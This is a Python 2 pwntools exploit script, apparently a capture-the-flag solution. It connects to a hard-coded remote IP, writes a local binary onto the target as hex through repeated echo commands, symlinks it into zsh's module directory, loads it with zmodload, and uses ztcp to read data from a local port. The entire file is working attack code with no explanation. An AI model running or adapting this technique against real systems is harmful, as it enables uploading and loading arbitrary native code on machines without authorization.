#!/usr/bin/env python2
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/07/05, 15:35
"""

from pwn import *
import os
import random

SIZE = 1024


def bin2hex(d):
    return '\\x'+'\\x'.join([d[i:i+2] for i in range(0, SIZE, 2)])


libname = ''.join(random.sample(string.ascii_letters, 6))
f = 'tcp.hex'
tcpData = ""
with open(f, 'r') as f:
    tcpData = f.read()

# p = remote('127.0.0.1', 10206)
p = remote('180.163.240.85', 10002)

for i in range(0, len(tcpData), SIZE):
    tmp = bin2hex(tcpData[i:i+SIZE])
    p.sendline('echo -n -e "%s" >> %s.so' % (tmp, libname))


p.sendline('mkdir -p /usr/local/lib/zsh/5.7.1/zsh/net/')
p.sendline('ln -s /%s.so /usr/local/lib/zsh/5.7.1/zsh/net/%s.so' %
           (libname, libname))
p.sendline('zmodload zsh/net/%s' % libname)
p.sendline('ztcp 127.0.0.1 1337')
p.sendline('fd=$REPLY')
p.sendline('read f <&$fd')
p.sendline('echo $f')
print p.recv()
